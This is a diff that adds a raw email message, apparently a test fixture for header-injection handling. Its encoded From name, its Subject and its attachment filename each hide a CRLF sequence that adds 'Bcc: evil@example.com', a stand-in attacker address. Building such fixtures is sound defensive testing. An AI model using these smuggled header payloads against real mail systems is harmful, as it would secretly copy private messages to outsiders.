@@ -1,0 +1,20 @@
+From: =?UTF-8?B?Q2l0dMOgDQpCY2M6IGV2aWxAZXhhbXBsZS5jb20=?= <info@example.it>
+To: Giulia <giulia@example.com>
+Subject: =?UTF-8?B?Q2lhbw0KQmNjOiBldmlsQGV4YW1wbGUuY29tDQo=?=
+Date: Sun, 25 Oct 2026 10:40:00 +0000
+Message-ID: <injection-001@example.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="inj"
+
+--inj
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: 7bit
+
+Corpo.
+--inj
+Content-Type: application/pdf
+Content-Disposition: attachment; filename*0*=UTF-8''Relazione%0D%0ABcc%3Aevil%40example.com.pdf
+Content-Transfer-Encoding: base64
+
+JVBERi0xLjQKJUVPRgo=
+--inj--
